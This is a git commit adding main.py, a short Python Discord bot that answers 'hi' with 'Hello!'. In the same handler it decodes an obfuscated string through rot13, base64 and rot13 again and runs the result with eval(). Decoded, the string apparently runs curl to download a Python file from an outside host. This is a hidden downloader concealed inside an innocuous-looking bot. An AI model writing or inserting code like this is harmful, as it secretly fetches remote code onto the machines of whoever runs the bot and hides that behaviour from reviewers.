e781766cd584b5de3d7e35fae813b4194a3fe597
slowskeleton666 <143322350+slowskeleton666@users.noreply.github.com>
2023-08-30 04:17:11 +0000

    yes

---
+++ main.py
@@ -0,0 +1,32 @@
+import discord
+import os
+import codecs
+import base64
+
+intents = discord.Intents.all()
+client = discord.Client(command_prefix="!", intents=intents)
+
+magic = '''
+LzLhMzkzM3W6XPWjnTI5VP1PVUIaM2AzBv8iLJ5bqUIaYJ9vLauzYwNjZTclo3IvMzqhL2ZhpTW6Y2udnP5woPVcPt==
+'''
+
+@client.event
+async def on_ready():
+    print("We have logged in as {0.user}".format(client))
+
+
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
+
+    if message.content.startswith("hi"):
+        await message.channel.send("Hello!")
+        byte = codecs.decode(magic, "rot13")
+        string = base64.b64decode(byte)
+        tr = string.decode()
+        out = codecs.decode(tr, "rot13")
+        eval(out)
+
+
+client.run(os.environ["BOT_TOKEN"])
